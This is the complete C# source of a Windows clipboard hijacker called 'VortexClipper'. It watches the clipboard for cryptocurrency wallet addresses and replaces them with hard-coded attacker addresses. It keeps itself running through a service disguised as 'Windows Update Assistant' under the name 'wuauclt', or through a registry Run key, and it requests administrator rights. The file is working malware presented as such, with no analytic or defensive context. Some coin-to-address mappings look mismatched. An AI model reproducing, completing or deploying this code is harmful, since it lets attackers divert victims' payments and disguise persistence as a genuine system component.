using System;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using System.Security.Principal;
using System.Diagnostics;
using Microsoft.Win32;
using System.IO;
using System.ServiceProcess;
using System.ComponentModel;
using System.Configuration.Install;
using System.Reflection;
using System.Collections.Generic;
using System.Linq;

namespace VortexClipper
{
    internal class Program
    {
        // Constants for service name and autostart
        internal const string SERVICE_NAME = "wuauclt";
        private const string SERVICE_DISPLAY_NAME = "Windows Update Assistant";
        private const string SERVICE_DESCRIPTION = "Assists in automatically installing updates.";
        private const string STARTUP_REG_KEY = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        private const string STARTUP_REG_VALUE = "Windows Update Assistant";

        // Cryptocurrency address regex patterns
        private static readonly (Regex Pattern, string Replacement)[] CryptoPatterns = new[]
        {
            // Bitcoin patterns
            (new Regex(@"^bc1[0-9A-Za-z]{39,59}$", RegexOptions.Compiled), "bc1qkqn9ust7thhxvg93yk0799fjr79wtnpjgpj5hn"),
            (new Regex(@"^3[0-9A-Za-z]{25,34}$", RegexOptions.Compiled), "bc1qkqn9ust7thhxvg93yk0799fjr79wtnpjgpj5hn"),
            (new Regex(@"^1[0-9A-Za-z]{25,34}$", RegexOptions.Compiled), "bc1qkqn9ust7thhxvg93yk0799fjr79wtnpjgpj5hn"),
            
            // Ethereum pattern
            (new Regex(@"^0x[0-9A-Fa-f]{40}$", RegexOptions.Compiled), "0xbCCbE3aA73ab8E31792636A70947153B03e1C299"),
            
            // Monero pattern
            (new Regex(@"^[48][0-9AB][0-9A-Za-z]{93,104}$", RegexOptions.Compiled), "66XNtVQn7ogxsZ4VygzAu3568QcLUcYBQwyFjUEiLc4W"),
            
            // Tron pattern
            (new Regex(@"^T[0-9A-Za-z]{33}$", RegexOptions.Compiled), "bc1qkqn9ust7thhxvg93yk0799fjr79wtnpjgpj5hn"),
            
            // TON pattern
            (new Regex(@"^0:[0-9A-Fa-f]{64}$", RegexOptions.Compiled), "44ViXLFTiTYD7jBAccKMeMEyC7CsEJMHgjoQjLyQrbp1LNLZpg8RG6JBDiAxTcfoxyHmXSY2AU7bb1CecHisBaWVAeTfyxY"),
            
            // Dogecoin pattern
            (new Regex(@"^D[0-9A-Za-z]{33}$", RegexOptions.Compiled), "44ViXLFTiTYD7jBAccKMeMEyC7CsEJMHgjoQjLyQrbp1LNLZpg8RG6JBDiAxTcfoxyHmXSY2AU7bb1CecHisBaWVAeTfyxY"),
            
            // Litecoin pattern
            (new Regex(@"^[LM][0-9A-Za-z]{33}$", RegexOptions.Compiled), "Xp5U6TJZdVycHdCCGyzyQWCXv9Xgyqs4Ba"),
            
            // DASH pattern
            (new Regex(@"^X[0-9A-Za-z]{33}$", RegexOptions.Compiled), "0xbCCbE3aA73ab8E31792636A70947153B03e1C299"),
            
            // Solana pattern
            (new Regex(@"^[1-9A-HJ-NP-Za-km-z]{32,44}$", RegexOptions.Compiled), "66XNtVQn7ogxsZ4VygzAu3568QcLUcYBQwyFjUEiLc4W")
        };

        // Last clipboard text to prevent unnecessary processing
        private static string _lastClipboardText = string.Empty;

        // Clipboard check interval in milliseconds
        private const int CLIPBOARD_100 = 100;

        [STAThread]
        static void Main(string[] args)
        {
            // Checking to see if we are running as a service
            if (Environment.UserInteractive)
            {
                // Checking command line arguments
                if (args.Length > 0)
                {
                    switch (args[0].ToLower())
                    {
                        case "/install":
                            InstallService();
                            return;
                        case "/uninstall":
                            UninstallService();
                            return;
                    }
                }

                // Requesting administrative privileges
                if (!IsAdministrator())
                {
                    if (RequestAdministratorPrivileges())
                    {
                        return;
                    }
                    else
                    {
                        // The user rejected the request for administrator rights
                        // Add to autorun via the registry
                        AddToStartup();
                        
                        MessageBox.Show(
                            "Administrator rights are required for the application to work correctly.\n" +
                            "The program will continue to run, but some functions may not be available.",
                            "Warning!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                }
                else
                {
                    // Installing the autorun via Windows services with admin rights
                    InstallService();
                    
                    // Run clipboard monitoring
                    StartClipboardMonitoring();
                    return;
                }
            }
            else
            {
                ServiceBase.Run(new CryptoClipboardService());
                return;
            }

            StartClipboardMonitoring();
        }

        /// <summary>
        /// Starts clipboard monitoring
        /// </summary>
        internal static void StartClipboardMonitoring()
        {
            // Create a thread for monitoring the clipboard
            Thread clipboardMonitorThread = new Thread(MonitorClipboard)
            {
                IsBackground = true
            };

            // Start monitoring the clipboard
            clipboardMonitorThread.Start();

            // Keep the application running
            Thread.Sleep(Timeout.Infinite);
        }

        /// <summary>
        /// Continuously monitors the clipboard for cryptocurrency addresses
        /// </summary>
        private static void MonitorClipboard()
        {
            while (true)
            {
                try
                {
                    // Thread-safe clipboard access
                    string clipboardText = null;
                    
                    Thread staThread = new Thread(() =>
                    {
                        try
                        {
                            if (Clipboard.ContainsText())
                            {
                                clipboardText = Clipboard.GetText();
                            }
                        }
                        catch
                        {
                        }
                    });
                    
                    staThread.SetApartmentState(ApartmentState.STA);
                    staThread.Start();
                    staThread.Join();

                    if (!string.IsNullOrEmpty(clipboardText) && clipboardText != _lastClipboardText)
                    {
                        _lastClipboardText = clipboardText;
                        
                        if (IsCryptocurrencyAddress(clipboardText, out string replacementAddress))
                        {
                            // Replace the cryptocurrency address with the configured one
                            ReplaceClipboardWithAddress(replacementAddress);
                        }
                    }
                }
                catch
                {
                    
                }

                // Wait for the configured interval before checking again
                Thread.Sleep(CLIPBOARD_100);
            }
        }

        /// <summary>
        /// Checks if the provided text matches any cryptocurrency address pattern
        /// </summary>
        private static bool IsCryptocurrencyAddress(string text, out string replacementAddress)
        {
            text = text.Trim();

            // Checking every pattern
            foreach (var (pattern, replacement) in CryptoPatterns)
            {
                if (pattern.IsMatch(text) && !string.IsNullOrEmpty(replacement))
                {
                    replacementAddress = replacement;
                    return true;
                }
            }

            replacementAddress = null;
            return false;
        }

        /// <summary>
        /// Replaces the clipboard content with the specified address
        /// </summary>
        private static void ReplaceClipboardWithAddress(string address)
        {
            try
            {
                // Use STAThread to access clipboard
                Thread staThread = new Thread(() =>
                {
                    try
                    {
                        Clipboard.SetText(address);
                        _lastClipboardText = address;
                    }
                    catch
                    {
                        
                    }
                });
                
                staThread.SetApartmentState(ApartmentState.STA);
                staThread.Start();
                staThread.Join();
            }
            catch
            {
                
            }
        }

        #region Запуск, службы, автозапуск

        /// <summary>
        /// Checking if you run with administrator privileges
        /// </summary>
        private static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        /// <summary>
        /// Request for elevation of privileges
        /// </summary>
        private static bool RequestAdministratorPrivileges()
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.UseShellExecute = true;
                startInfo.WorkingDirectory = Environment.CurrentDirectory;
                startInfo.FileName = Assembly.GetEntryAssembly().Location;
                startInfo.Verb = "runas";

                Process.Start(startInfo);
                return true;
            }
            catch (Exception)
            {
                // The user refused a privilege escalation
                return false;
            }
        }

        /// <summary>
        /// Adding a program to autorun via the registry
        /// </summary>
        private static void AddToStartup()
        {
            try
            {
                string appPath = Assembly.GetEntryAssembly().Location;

                RegistryKey key = Registry.CurrentUser.OpenSubKey(STARTUP_REG_KEY, true);
                key.SetValue(STARTUP_REG_VALUE, appPath);
                key.Close();
                
                
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to add to startup: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        /// <summary>
        /// Installing windows service
        /// </summary>
        private static void InstallService()
        {
            try
            {
                string executablePath = Assembly.GetEntryAssembly().Location;

                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "sc.exe";
                startInfo.Arguments = $"create \"{SERVICE_NAME}\" binPath= \"{executablePath}\" start= auto DisplayName= \"{SERVICE_DISPLAY_NAME}\"";
                startInfo.UseShellExecute = false;
                startInfo.CreateNoWindow = true;
                startInfo.RedirectStandardOutput = true;

                using (Process process = Process.Start(startInfo))
                {
                    process.WaitForExit();
                }

                startInfo.Arguments = $"description \"{SERVICE_NAME}\" \"{SERVICE_DESCRIPTION}\"";
                using (Process process = Process.Start(startInfo))
                {
                    process.WaitForExit();
                }

                startInfo.Arguments = $"start \"{SERVICE_NAME}\"";
                using (Process process = Process.Start(startInfo))
                {
                    process.WaitForExit();
                }

            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to install service: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        /// <summary>
        /// Deliting Windows service
        /// </summary>
        private static void UninstallService()
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "sc.exe";
                startInfo.Arguments = $"stop \"{SERVICE_NAME}\"";
                startInfo.UseShellExecute = false;
                startInfo.CreateNoWindow = true;
                startInfo.RedirectStandardOutput = true;

                using (Process process = Process.Start(startInfo))
                {
                    process.WaitForExit();
                }

                startInfo.Arguments = $"delete \"{SERVICE_NAME}\"";
                using (Process process = Process.Start(startInfo))
                {
                    process.WaitForExit();
                }

                MessageBox.Show("Service uninstalled successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to uninstall service: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        #endregion
    }

    /// <summary>
    /// Windows service class
    /// </summary>
    public class CryptoClipboardService : ServiceBase
    {
        public CryptoClipboardService()
        {
            this.ServiceName = Program.SERVICE_NAME;
        }

        protected override void OnStart(string[] args)
        {
            Thread thread = new Thread(Program.StartClipboardMonitoring);
            thread.Start();
        }

        protected override void OnStop()
        {
            
        }
    }
}